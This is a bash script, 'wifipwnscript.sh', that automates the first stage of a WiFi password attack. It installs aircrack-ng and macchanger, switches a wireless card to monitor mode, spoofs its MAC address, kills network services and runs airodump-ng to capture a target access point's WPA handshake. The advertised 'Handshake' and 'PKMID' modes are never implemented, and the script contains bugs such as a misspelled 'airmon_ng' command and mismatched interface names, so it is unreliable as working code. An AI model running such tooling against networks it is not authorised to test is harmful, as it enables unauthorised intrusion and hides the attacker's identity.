#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
	echo "Exiting..."
	tput cnorm; airmon_ng stop ${networkCard}mon > /dev/null 2>&1
}

function helpPanel(){
	echo -e "\n${turquoiseColour}[*]${endColour}${grayColour} Usage: ./wifipwnscript.sh${endColour}"
	echo -e "\t${turquoiseColour}a)${endColour}${yellowColour} Attack Mode${endColour}"
	echo -e "\t\t${redColour}Handshake${endColour}"
	echo -e "\t\t${redColour}PKMID${endColour}"
	echo -e "\t${turquoiseColour}n)${endColour}${yellowColour} Network Card Name${endColour}\n"

	exit 0
}

function dependencies(){
	clear; dependencies=(aircrack-ng macchanger)

	echo -e "${turquoiseColour}[*]${endColour}${grayColour} Checking Necessary utilities...${endColour}"

	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Utility${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"

		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
		echo -e " ${greenColour}(V)${endColour}"
		else
		echo -e " ${redColour}(X)${endColour}"
		echo -e "${yellowColour}[*]${endColour}${grayColour} Installing Utility ${endColour}${blueColour}$program${endColour}${grayColour}...${endColour}"
		apt-get install $program -y > /dev/null 2>&1
		fi; sleep 1
	done

}

function startAttack(){
	clear
	echo -e "${yellowColour}[*]${endColour}${grayColour} Setting up network card ...${endColour}\n"
	airmon-ng start $networkCard > /dev/null 2>&1
	ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
	ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null

	echo -e "${yellowColour}[*]${endColour}${grayColour} New MAC Address assigned ${endColour}${purpleColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"

	xterm -hold -e "airodump-ng ${networkCard}mon" &
	airodump_xterm_PID=$!
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} AP Name: ${endColour}" && read apName
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} AP Channel: ${endColour}" && read apChannel

	kill -9 $airodump_xterm_PID
	wait $airodump_xterm_PID 2>/dev/null

	xterm -hold -e "airodump-ng -c $apChannel -w Cap --essid $apName ${networkCard}mon0" &
	airodump_filter_xterm_PID=$!

	sleep 50

}

#Main Function

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a) attack_mone=$OPTARG; let parameter_counter+=1 ;;
			n) networkCard=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		dependencies
		startAttack
		tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
	fi

else
	echo -e "\n${redColour}ROOT REQUIRED${endColour}\n"

fi
